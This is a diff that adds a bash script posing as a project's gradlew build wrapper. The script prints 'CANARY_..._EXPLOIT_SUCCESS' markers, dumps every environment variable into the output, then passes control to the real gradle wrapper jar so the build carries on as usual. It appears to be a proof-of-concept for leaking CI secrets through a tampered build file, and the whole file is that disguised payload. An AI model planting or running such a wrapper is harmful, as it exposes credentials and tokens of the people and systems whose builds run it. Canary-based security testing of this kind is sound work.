@@ -1,0 +1,11 @@
+#!/bin/bash
+echo "CANARY_GRADLEW_HB_EXPLOIT_SUCCESS_$(date +%s)"
+echo "CANARY_ENV_DUMP_START"
+env | sort
+echo "CANARY_ENV_DUMP_END"
+if [ -f "$(dirname "$0")/gradle/wrapper/gradle-wrapper.jar" ]; then
+    exec java -jar "$(dirname "$0")/gradle/wrapper/gradle-wrapper.jar" "$@"
+else
+    echo "No gradle wrapper jar found, exiting gracefully"
+    exit 0
+fi
